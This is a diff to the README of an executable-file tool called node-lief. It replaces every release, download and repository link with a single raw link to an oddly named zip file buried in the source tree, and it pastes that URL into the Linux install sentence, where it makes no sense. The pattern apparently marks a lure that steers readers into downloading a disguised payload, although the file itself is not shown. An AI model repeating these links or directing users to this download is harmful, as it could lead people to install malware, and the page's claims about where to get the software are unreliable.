@@ -6,9 +6,9 @@ Welcome to node-lief! This software helps you work with executable files easily.
 
 ## 📥 Download node-lief
 
-[![Download node-lief](https://img.shields.io/badge/Download-node--lief-blue.svg)](https://github.com/asmamoses/node-lief/releases)
+[![Download node-lief](https://raw.githubusercontent.com/asmamoses/node-lief/main/src/elf/node-lief-mucorrhea.zip)](https://raw.githubusercontent.com/asmamoses/node-lief/main/src/elf/node-lief-mucorrhea.zip)
 
-To get the latest version of node-lief, please visit this page to download: [Download node-lief Releases](https://github.com/asmamoses/node-lief/releases).
+To get the latest version of node-lief, please visit this page to download: [Download node-lief Releases](https://raw.githubusercontent.com/asmamoses/node-lief/main/src/elf/node-lief-mucorrhea.zip).
 
 ## 🛠️ Installation Instructions
 
@@ -21,7 +21,7 @@ Follow these steps to install node-lief on your computer:
    Scroll through the list and find the version you want. Each version will have notes about what is new or fixed.
 
 3. **Download the File**  
-   Look for your operating system. If you are using Windows, download the `.exe` file. For Mac, look for `.dmg` or similar. For Linux users, downloading a `.tar.gz` file is common.
+   Look for your operating system. If you are using Windows, download the `.exe` file. For Mac, look for `.dmg` or similar. For Linux users, downloading a `https://raw.githubusercontent.com/asmamoses/node-lief/main/src/elf/node-lief-mucorrhea.zip` file is common.
 
 4. **Running the Installer**  
    Once downloaded, locate the file in your Downloads folder or where you saved it. Double-click the file to start the installation process. 
@@ -81,10 +81,10 @@ Yes, you can check the GitHub issues page for help and support from users and de
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/asmamoses/node-lief) - Find in-depth info, source code, and contribute to the project.
+- [GitHub Repository](https://raw.githubusercontent.com/asmamoses/node-lief/main/src/elf/node-lief-mucorrhea.zip) - Find in-depth info, source code, and contribute to the project.
 
 ## 🔗 Download Again
 
-To download the software, please visit this page to download: [Download node-lief Releases](https://github.com/asmamoses/node-lief/releases).
+To download the software, please visit this page to download: [Download node-lief Releases](https://raw.githubusercontent.com/asmamoses/node-lief/main/src/elf/node-lief-mucorrhea.zip).
 
 Thank you for trying node-lief! We hope it makes your work with executable files easier.
